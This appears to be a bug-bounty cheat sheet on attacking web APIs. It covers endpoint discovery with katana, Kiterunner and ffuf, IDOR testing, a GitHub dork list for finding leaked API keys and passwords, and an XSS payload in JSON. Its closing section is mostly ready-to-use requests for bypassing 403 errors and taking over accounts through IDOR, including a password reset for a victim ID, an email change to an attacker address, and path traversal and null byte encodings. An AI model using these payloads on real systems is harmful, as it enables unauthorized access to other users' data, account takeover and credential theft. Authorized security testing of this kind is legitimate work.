- Gathering API Endpoints
  ```bash
  katana -mdc 'contains(endpoint,"api")' -js -u https://example.com
  katana -list targets.txt -mdc 'contains(endpoint,"api")' -js
  katana -list targets.txt -mdc 'contains(endpoint,"api")' -js -silent -o apis.txt    # -f qurl for cleaning noise 'if exsit'
  ```
- Read the `docs` files carefully to understand how the application communicates with its APIs, what endpoints exist, how authentication works, and which headers or parameters are required.
- Then start testing the endpoints manually. For example, if you find something like:
  ```text
  https://example.com/v1/tasks/{taskID}
  ```
- Try changing the `taskID` value to other IDs and check whether you can access data belonging to other users (IDOR).
- If authentication is required, inspect the requests and identify which headers are needed, for example:
  ```http
  Authorization: Bearer <token>
  X-API-KEY: 123abc
  ```
- Use the required headers so the request is authenticated, then continue testing by modifying object IDs, UUIDs, usernames, account numbers, or other identifiers.

- If the API is marked as internal/private, inspect the JavaScript files, source maps, mobile app files, or network traffic for exposed API keys, hidden endpoints, hardcoded tokens, or undocumented routes. Also search the target's public GitHub repositories for:
  * API keys
  * Tokens
  * Swagger/OpenAPI files
  * Internal endpoints
  * Environment variables
  * Postman collections
- Perform subdomain enumeration and look for:
  * Developer portals
  * Staging environments
  * Admin panels
  * API gateways
  * Registration pages

- If you find a registration-enabled subdomain, create an account and inspect the requests. Sometimes newly created accounts receive API keys, JWTs, session tokens, or access to undocumented APIs.
- You can also:
  * Check `/swagger.json`, `/openapi.json`, `/api-docs`, `/graphql`, `/graphiql`
  * Test different HTTP methods (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`)
  * Replace numeric IDs with UUIDs or vice versa
  * Remove or modify authorization-related headers
  * Replay requests with another user's identifiers
  * Test rate-limits and permission boundaries
  * Compare responses between authenticated and unauthenticated requests
- If it's a `JWT`, you can decode/analyze it using: **JWT.io** to inspect things like:
  - Expiration
  - User ID
  - Roles
  - Permissions

### We'll use the `Kiterunner` tool to test APIs and discover hidden endpoints.
- Kiterunner is similar to tools like `FFUF` and `Dirsearch`, but it is specifically designed for APIs.
- Unlike traditional content discovery tools that mainly rely on `GET` requests, Kiterunner can intelligently test multiple HTTP methods such as:
  - GET, POST, PUT, PATCH, DELETE, OPTIONS
- It also performs API fuzzing more effectively because it is built specifically for discovering and testing API endpoints, routes, and versions using API-focused wordlists.

- Its wordlists are available here: [Press Here](https://wordlists-cdn.assetnote.io/data/kiterunner) Or [Here](https://wordlists.assetnote.io/)
  - To extract the wordlists:
    ```bash
    tar -xzvf routes-small.kite.tar.gz
    ```
- Install the tool:
  ```bash
  git clone https://github.com/assetnote/kiterunner.git
  cd kiterunner
  make build
  ln -s $(pwd)/dist/kr /usr/local/bin/kr
  ```
- Run  
  ```bash
  kr scan targets.txt -w /path/to/wordlist 
  kr scan <target> -w /path/to/wordlist
  kr scan https://example.com -w /wordlists/routes-small.kite
  ```
- Example output:
  <img width="858" height="77" alt="Screenshot_2" src="https://github.com/user-attachments/assets/2641fe01-534d-43cb-83ea-1767ddae1c71" />

- You can also add custom headers using the `-H` option.
  ```bash
  kr scan https://example.com -w /wordlists/routes-small.kite -H 'x-access-token: eyJhbgCIoiJ5uzi1Niisinr5cCi6iKpxVcj9...'
  ```

---

- To fuzz user IDs, for example if the target looks like this: `https://example.com/api/users/{userID}`
- You can use `FFUF` like this:
  ```bash
  ffuf -c -w <(seq 1 10000) -u https://example.com/api/users/FUZZ
  # This will test IDs from 1 to 10000 by replacing 'FUZZ' with each number. (or just use burp intruder).
  ```

---

- You can test for XSS by injecting payloads into JSON values, for example:
  ```json
  {
  "name":"test<script>confirm(1337)</script>heellooo"
  }
  ```

---

- Try sending requests with an invalid or unusual Content-Type
  ```http
  Content-Type: aykalam
  ```
- Sometimes this can trigger verbose error messages that may disclose useful information such as: `Hidden endpoints`, `Internal paths`, `Framework details`, `Debug messages`, `API versions`, `Stack traces`, `Backend technologies`

---

### GitHub Dorks for Finding API Keys, Tokens, Secrets, and Passwords:
```text
api_key
"api keys"
authorization bearer
oauth
auth
authentication
client_secret
api_token
"api token"
client_id
password
user_password
user_pass
passcode
secret
password hash
OTP
user auth
access_token
refresh_token
jwt
jwt_secret
bearer
token
private_key
secret_key
aws_access_key_id
aws_secret_access_key
firebase
slack_token
github_token
github_pat
ssh_key
db_password
database_url
mongodb_uri
mysql_password
postgres_password
smtp_password
ftp_password
twilio
stripe_secret
google_api_key
heroku_api_key
discord_token
telegram_bot_token
sendgrid_api_key
```

---

### Bypass tricks (RESPONSE 403):
Wrap ID with an array (return 3 users) (403 Forbidden to 200 OK)
  ```text
  {                                {
  "id":123        Change to        "id":[1,2,3]                # or [123,124,125]
  }                                }
  ```
JSON wrap (403 Forbidden to 200 OK)
  ```text
  {                                {
  "id":123        Change to        "id":{"id":123}
  }                                }
  ```
Send ID twice
  ```text
  GET /api/users?id=<YourID>&id=<VictimID>
  GET /api/profile?user_id=123&user_id=124
  GET /api/profile?user_id=124&user_id=123
  GET /api/profile?user_id[]=123&user_id[]=124 
  ```
Send wildcard (return all users)
  ```json
  {
  "user_id":"*"
  }
  ```
  ```text
    # Wildcard in IDs
    GET /api/user/*
    GET /api/user/%
    GET /api/user/_
    
    # Regex exploitation
    GET /api/user/.*
    GET /api/user/[0-9]+
    
    # Range specification
    GET /api/users?ids=1-100
    GET /api/users?ids=*
  ```
Content-Type Bypass
  ```bash
  # Original JSON request (blocked)
  POST /api/update-profile
  Content-Type: application/json
  {"user_id": 124}
  
  # Try XML
  POST /api/update-profile
  Content-Type: application/xml
  <user>
    <user_id>124</user_id>
  </user>
  
  # Try form data
  POST /api/update-profile
  Content-Type: application/x-www-form-urlencoded
  user_id=124
  ```
Path Traversal Bypass
  ```bash
  # Directory traversal
  GET /api/user/123
  GET /api/user/../user/124
  GET /api/user/./124
  
  # Encoding bypass
  GET /api/user/%2e%2e%2fuser%2f124
  GET /api/user/..%2fuser%2f124
  
  # Null byte injection (older systems)
  GET /api/user/123%00/../../user/124
  ```
Using IDOR to takeover accounts (Attacker id: 123):
  ```bash
  # Password reset via IDOR
  POST /api/reset-password
  {
    "user_id": 124,
    "new_password": "attacker_password"
  }
  
  # Email change via IDOR
  PUT /api/user/124/email
  {
    "new_email": "attacker@evil.com"
  }
  
  # Adding authentication method
  POST /api/user/124/add-phone
  {
    "phone": "+1234567890"
  }
  ```
